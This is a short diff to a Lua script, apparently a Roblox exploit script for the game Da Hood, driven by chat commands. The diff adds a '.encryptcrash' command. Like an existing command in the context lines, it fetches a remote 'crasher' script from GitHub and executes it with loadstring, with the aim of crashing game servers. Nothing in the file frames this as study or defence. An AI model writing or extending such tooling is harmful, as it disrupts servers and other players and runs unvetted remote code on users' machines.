@@ -40,6 +40,11 @@ local function cmds(msg,plr)
 				loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 			end
 		end
+		if msg == ".encryptcrash" then
+			if not isamod then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
+			end
+		end
 		if msg == ".refresh" then
 			if not isamod then
 				game.Players.LocalPlayer.Character.Humanoid.Health = 0
@@ -112,7 +117,7 @@ local function cmds(msg,plr)
 					amt = tostring(amt)
 					return amt:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
 				end
-				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(fornum(amt).."cm Dropped.", 'All')
+				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(fornum(amt).."cm", 'All')
 			end
 		end
 		if msg == ".unpickup" then
